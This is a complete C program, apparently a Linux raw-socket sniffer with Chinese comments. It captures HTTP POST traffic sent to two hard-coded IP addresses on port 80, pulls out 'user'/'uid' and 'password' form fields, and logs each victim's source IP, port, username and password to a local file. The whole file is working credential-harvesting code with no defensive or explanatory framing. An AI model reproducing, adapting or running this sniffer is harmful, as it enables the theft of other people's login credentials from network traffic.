#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>   // for sockaddr_in
#include <sys/types.h>    // for socket
#include <sys/socket.h>   // for socket
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <pthread.h>

#define MAX_SIZE 65537
#define USERNAME_1 "uid"
#define USERNAME_2 "user"
#define PASSWORD "password"
#define IPADDRESS_1 "210.44.144.55"
#define IPADDRESS_2 "172.17.21.121"

typedef struct DLC_Header
{
    unsigned char DesMAC[6];     //以太网目的地址
    unsigned char SrcMAC[6];     //以太网源地址
    unsigned short EtherType;    //帧类型
} DLCHEADER;

typedef struct ipheader
{
    unsigned char ip_hl:4;    /*header length(报头长度）*/
    unsigned char ip_v:4;    /*version(版本)*/
    unsigned char ip_tos;    /*type os service服务类型*/
    unsigned short int ip_len;   /*total length (总长度)*/
    unsigned short int ip_id;   /*identification (标识符)*/
    unsigned short int ip_off;   /*fragment offset field(段移位域)*/
    unsigned char ip_ttl;    /*time to live (生存时间)*/
    unsigned char ip_p;     /*protocol(协议)*/
    unsigned short int ip_sum;   /*checksum(校验和)*/
    unsigned int ip_src;    /*source address(源地址)*/
    unsigned int ip_dst;    /*destination address(目的地址)*/
} IP;         /* total ip header length: 20 bytes (=160 bits) */

typedef struct tcpheader
{
    unsigned short int sport;   /*source port (源端口号)*/
    unsigned short int dport;   /*destination port(目的端口号)*/
    unsigned int th_seq;    /*sequence number(包的序列号)*/
    unsigned int th_ack;    /*acknowledgement number(确认应答号)*/
    unsigned char th_x:4;    /*unused(未使用)*/
    unsigned char th_off:4;    /*data offset(数据偏移量)*/
    unsigned char Flags;    /*标志全*/
    unsigned short int th_win;   /*windows(窗口)*/
    unsigned short int th_sum;   /*checksum(校验和)*/
    unsigned short int th_urp;   /*urgent pointer(紧急指针)*/
} TCP;

FILE *file=NULL;

int CreateSocket(int *soc)
{
    if((*soc=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_IP)))<0)
        return 0;

    return 1;
}

void save(char *packet,char *user,char *pass)
{
    IP *IPHeader=NULL;
    TCP *TCPHeader=NULL;

    IPHeader=(IP *)(packet+sizeof(DLCHEADER));
    TCPHeader=(TCP *)(packet+sizeof(DLCHEADER)+sizeof(IP));

    fseek(file,0,SEEK_END);
    fprintf(file,"来源IP:%s\t来源端口:%d\tUSER:%s\tPASS:%s\n",inet_ntoa(*(struct in_addr *)&IPHeader->ip_src),htons(TCPHeader->sport),\
            user,pass);
    fflush(file);

    return;
}

void *filter(char *packet,int RecvSize)
{
    char *Data=NULL;
    char *Puser=NULL,*Ppass=NULL;
    char *PuserEnd=NULL,*PpassEnd=NULL;
    char user[MAX_SIZE],pass[MAX_SIZE];
    char *temp=Data;
    int i,user_flag;

    if(RecvSize<=sizeof(DLCHEADER)+sizeof(IP)+sizeof(TCP)+5)
        return NULL;
    Data=packet+sizeof(DLCHEADER)+sizeof(IP)+sizeof(TCP);
    memset(user,NULL,sizeof(user));
    memset(pass,NULL,sizeof(pass));
    if(strncmp(Data,"POST",4))
    {
        //收到的不是POST数据包
        return NULL;
    }
    for(i=0; i<strlen(Data)-1 && Data[i]!=NULL; i++)
        if(Data[i]=='\n')
            temp=Data+i;
    Data=temp;

    user_flag=0;
    if((Puser=strstr(Data,USERNAME_1))==NULL)
    {
        user_flag=1;
        if((Puser=strstr(Data,USERNAME_2))==NULL)
            return NULL;
    }

    if(user_flag==0)
        Puser+=strlen(USERNAME_1)+1;
    else
        Puser+=strlen(USERNAME_2)+1;

    if(!(Ppass=strstr(Puser,PASSWORD)))
    {
        //POST数据包中无指定的字段
        return NULL;
    }

    Ppass+=strlen(PASSWORD)+1;
    PuserEnd=strchr(Puser,'&');
    PpassEnd=strchr(Ppass,'&');
    if(PpassEnd==NULL) PpassEnd=strchr(Ppass,'\0');
    if(!PuserEnd || !PpassEnd)
        return NULL;

    memcpy(user,Puser,PuserEnd-Puser);
    memcpy(pass,Ppass,PpassEnd-Ppass);
    save(packet,user,pass);

    return NULL;
}

int Sniffer(int *soc)
{
    IP *IPHeader=NULL;
    TCP *TCPHeader=NULL;
    char *Data=NULL;
    char recvBuff[MAX_SIZE];
    int RecvSize;

    IPHeader=(IP *)(recvBuff+sizeof(DLCHEADER));
    TCPHeader=(TCP *)(recvBuff+sizeof(DLCHEADER)+sizeof(IP));
    Data=recvBuff+sizeof(DLCHEADER)+sizeof(IP)+sizeof(TCP);

    while(1)
    {
        memset(recvBuff,NULL,sizeof(recvBuff));
        if((RecvSize=recvfrom(*soc,recvBuff,sizeof(recvBuff)-1,0,NULL,NULL))<1) continue;

        if((strcmp(inet_ntoa(*(struct in_addr *)&IPHeader->ip_dst),IPADDRESS_1)==0 || \
                strcmp(inet_ntoa(*(struct in_addr *)&IPHeader->ip_dst),IPADDRESS_2)==0) && htons(TCPHeader->dport)==80)
        {
            //数据包的目标地址是本机
            filter(recvBuff,RecvSize);
        }
    }

    return 1;
}

int main(int argc,char *argv[])
{
    int socket;

    if(!CreateSocket(&socket))
    {
        printf("创建套接字失败。\n");
        return -1;
    }
    if((file=fopen("Data","rt+"))==NULL)
        if((file=fopen("Data","wt+"))==NULL)
        {
            printf("创建文件失败。\n");
            return -1;
        }
    printf("Start...\n");
    Sniffer(&socket);

    return 0;
}











